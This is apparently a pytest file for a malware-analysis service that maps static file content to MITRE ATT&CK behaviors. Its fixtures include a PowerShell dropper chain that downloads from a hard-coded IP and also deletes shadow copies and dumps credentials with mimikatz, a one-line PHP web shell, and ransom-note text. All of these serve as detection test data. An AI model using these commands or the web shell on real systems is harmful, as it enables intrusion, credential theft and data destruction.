"""Milestone 3: Behavioral analysis (static ATT&CK inference)."""

import io

from fastapi.testclient import TestClient

from app.main import app
from app.modules.behavioral_analysis.engine import BEHAVIOR_CATALOG, evaluate_behaviors, compute_behavioral_risk
from app.modules.behavioral_analysis.service import behavioral_analysis_service

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b & "
    b"bitsadmin /transfer j http://45.147.230.112/c c & schtasks /create /tn p /tr b; "
    b"vssadmin delete shadows /all /quiet; mimikatz sekurlsa::logonpasswords lsass.exe"
)
BENIGN = b"hello world this is a normal document about cats"
PHP_SHELL = b"<?php eval(base64_decode($_REQUEST['c'])); system($_GET['cmd']); ?>"
RANSOM = b"All your files have been encrypted. To get the decryption key send bitcoin to our .onion site."


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()["access_token"]
    return {"Authorization": f"Bearer {tok}"}


# --- engine unit -----------------------------------------------------------

def test_catalog_has_expected_behaviors():
    assert len(BEHAVIOR_CATALOG) >= 20
    ids = {b["id"] for b in BEHAVIOR_CATALOG}
    assert "B001" in ids and "B015" in ids and "B023" in ids
    # all have MITRE ids
    for b in BEHAVIOR_CATALOG:
        assert b["technique_id"].startswith("T")
        assert b["tactic"] in {"Execution", "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access", "Discovery", "Collection", "Command and Control", "Impact", "Exfiltration", "Initial Access", "Lateral Movement"}


def test_benign_has_no_behaviors():
    raw = evaluate_behaviors(BENIGN)
    score, level, conf = compute_behavioral_risk(raw)
    assert score == 0
    assert level == "low"
    assert all(not r["observed"] for r in raw)


def test_dropper_triggers_many_behaviors():
    raw = evaluate_behaviors(
        DROPPER,
        suspicious_strings=["PowerShell execution", "Encoded PowerShell command", "Command shell invocation", "LOLBins (rundll32/regsvr32/mshta)", "certutil / bitsadmin download", "Scheduled task creation", "Shadow copy deletion", "Credential tooling"],
        yara_matches=[
            {"rule": "PowerShell_Download_Cradle", "meta": {"severity": "high", "family": "Downloader", "mitre": "T1059.001, T1105"}},
            {"rule": "Credential_Access_Tooling", "meta": {"severity": "high", "family": "Stealer", "mitre": "T1003"}},
            {"rule": "ShadowCopy_Deletion", "meta": {"severity": "high", "family": "Impact", "mitre": "T1490"}},
        ],
        network={"urls": ["http://45.147.230.112/a.ps1"], "ips": ["45.147.230.112"], "domains": []},
        metadata={"shannon_entropy": 4.2, "likely_packed": False, "extension_matches_content": True, "extension": "ps1", "file_type": "ASCII text"},
    )
    observed = [r for r in raw if r["observed"]]
    assert len(observed) >= 6
    ids = {r["id"] for r in observed}
    assert "B001" in ids  # powershell
    assert "B015" in ids  # credential dumping
    assert "B024" in ids  # shadow deletion
    score, level, _ = compute_behavioral_risk(raw)
    assert level == "high"
    assert score > 60


def test_webshell_triggers_persistence():
    raw = evaluate_behaviors(PHP_SHELL, yara_matches=[{"rule": "WebShell_Indicators", "meta": {"severity": "high", "family": "WebShell", "mitre": "T1505.003"}}])
    assert any(r["id"] == "B007" and r["observed"] for r in raw)


def test_ransom_triggers_impact():
    raw = evaluate_behaviors(RANSOM, yara_matches=[{"rule": "Ransomware_Note_Or_Behavior", "meta": {"severity": "high", "family": "Ransomware", "mitre": "T1486, T1490"}}])
    assert any(r["id"] == "B023" and r["observed"] for r in raw)


def test_service_analyze_returns_schema():
    result = behavioral_analysis_service.analyze(DROPPER, object_path="dropper.bin")
    assert result.risk_level in ("low", "medium", "high")
    assert result.behaviors_detected > 0
    assert result.technique_coverage
    assert result.attack_chain
    assert "never executed" in result.summary.lower() or "static" in result.summary.lower()


def test_service_benign():
    result = behavioral_analysis_service.analyze(BENIGN, object_path="benign.txt")
    assert result.risk_score == 0
    assert result.behaviors_detected == 0
    assert result.risk_level == "low"


# --- API -------------------------------------------------------------------

def test_behavior_catalog_endpoint():
    resp = client.get("/api/v1/behavior/catalog", headers=_headers())
    assert resp.status_code == 200
    body = resp.json()
    assert body["total"] >= 20
    assert "tactic_order" in body


def test_behavior_analyze_upload():
    resp = client.post("/api/v1/behavior/analyze", files={"file": ("dropper.bin", io.BytesIO(DROPPER), "application/octet-stream")}, headers=_headers())
    assert resp.status_code == 200
    body = resp.json()
    assert body["behaviors_detected"] >= 5
    assert body["risk_level"] == "high"
    assert body["attack_chain"]


def test_behavior_analyze_benign():
    resp = client.post("/api/v1/behavior/analyze", files={"file": ("benign.txt", io.BytesIO(BENIGN), "text/plain")}, headers=_headers())
    assert resp.status_code == 200
    assert resp.json()["behaviors_detected"] == 0
    assert resp.json()["risk_level"] == "low"


def test_behavior_from_analysis():
    # first get a full pipeline result
    upload = client.post("/api/v1/files/upload", files={"file": ("dropper.bin", io.BytesIO(DROPPER), "application/octet-stream")}, headers=_headers())
    assert upload.status_code == 201
    full = upload.json()
    assert "behavioral_analysis" in full
    assert full["behavioral_analysis"]["behaviors_detected"] >= 5
    # then derive behavioral via from-analysis endpoint
    resp = client.post("/api/v1/behavior/from-analysis", json=full, headers=_headers())
    assert resp.status_code == 200
    assert resp.json()["behaviors_detected"] == full["behavioral_analysis"]["behaviors_detected"]


def test_behavior_requires_auth():
    resp = client.post("/api/v1/behavior/analyze", files={"file": ("x.bin", io.BytesIO(b"hi"), "application/octet-stream")})
    assert resp.status_code in (401, 403)


def test_upload_pipeline_includes_behavioral():
    resp = client.post("/api/v1/files/upload", files={"file": ("dropper.bin", io.BytesIO(DROPPER), "application/octet-stream")}, headers=_headers())
    assert resp.status_code == 201
    body = resp.json()
    ba = body.get("behavioral_analysis")
    assert ba is not None
    assert ba["behaviors_total"] >= 20
    assert isinstance(ba["behaviors"], list)
    assert isinstance(ba["tactics_summary"], list)
